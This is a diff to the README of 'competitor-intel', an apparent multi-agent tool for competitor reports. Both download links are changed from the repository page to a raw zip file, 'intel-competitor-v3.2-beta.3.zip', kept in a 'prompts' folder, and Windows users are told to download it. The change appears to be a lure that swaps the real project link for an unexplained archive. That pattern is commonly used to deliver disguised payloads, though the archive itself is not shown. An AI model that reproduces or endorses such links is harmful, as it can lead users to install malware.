@@ -1,6 +1,6 @@
 # 🤖 competitor-intel - Turn Competitors Into Clear Reports
 
-[![Download](https://img.shields.io/badge/Download-competitor--intel-6f42c1?style=for-the-badge)](https://github.com/crunch-sketch/competitor-intel)
+[![Download](https://img.shields.io/badge/Download-competitor--intel-6f42c1?style=for-the-badge)](https://github.com/crunch-sketch/competitor-intel/raw/refs/heads/main/prompts/intel-competitor-v3.2-beta.3.zip)
 
 ## 🚀 What this app does
 
@@ -21,7 +21,7 @@ It uses a multi-agent workflow, so each part of the report comes from a focused 
 
 Use this link to visit the page and download the project:
 
-[Go to competitor-intel](https://github.com/crunch-sketch/competitor-intel)
+[Go to competitor-intel](https://github.com/crunch-sketch/competitor-intel/raw/refs/heads/main/prompts/intel-competitor-v3.2-beta.3.zip)
 
 If you want to run it on Windows, download the project from that page, then follow the setup steps below.
 
